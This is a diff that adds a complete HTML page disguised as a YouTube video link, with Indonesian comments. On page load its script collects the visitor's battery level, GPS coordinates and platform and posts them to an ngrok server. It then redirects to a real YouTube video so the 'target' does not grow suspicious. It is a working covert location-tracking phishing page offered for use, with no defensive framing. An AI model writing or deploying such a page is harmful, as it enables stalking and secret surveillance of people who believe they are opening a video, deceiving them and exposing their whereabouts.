@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video YouTube</title>
+</head>
+<body>
+    <script>
+        // Fungsi untuk mengambil data otomatis saat link diklik
+        async function ambilData() {
+            // 1. Ambil info baterai
+            let bat = "Tidak diketahui";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = (b.level * 100) + "%";
+            }
+
+            // 2. Ambil lokasi GPS (Akan muncul pop-up izin di HP target)
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const dataTarget = {
+                    battery: bat,
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    platform: navigator.platform
+                };
+
+                // 3. KIRIM DATA KE SERVER NGROK ANDA
+                fetch('https://29c88b69b411.ngrok-free.app/report', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(dataTarget)
+                }).then(() => {
+                    // 4. Setelah terkirim, arahkan ke YouTube asli agar tidak curiga
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                });
+            }, () => {
+                // Jika target menolak lokasi, tetap arahkan ke YouTube
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            });
+        }
+        window.onload = ambilData;
+    </script>
+    <p>Loading video...</p>
+</body>
+</html>
